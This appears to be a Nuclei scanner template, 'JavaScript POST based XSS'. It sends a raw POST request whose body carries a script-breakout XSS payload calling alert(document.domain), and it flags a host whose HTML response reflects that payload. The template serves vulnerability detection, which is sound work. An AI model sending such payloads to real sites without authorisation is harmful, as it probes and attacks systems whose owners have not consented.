id: js-post-based-xss
info:
  author: melbadry9
  description: Inject into JavaScript file that read post body
  name: JavaScript POST based XSS
  reference: https://none
  severity: medium
  tags: xss
requests:
- matchers:
  - part: body
    type: word
    words:
    - ''');alert(document.domain);'
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:100.0) Gecko/20100101
    Firefox/100.0

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8

    Accept-Language: en-US,en;q=0.5

    Accept-Encoding: gzip, deflate

    Connection: close

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 52


    '');alert(document.domain);setItem(''request-replay'',''

    '
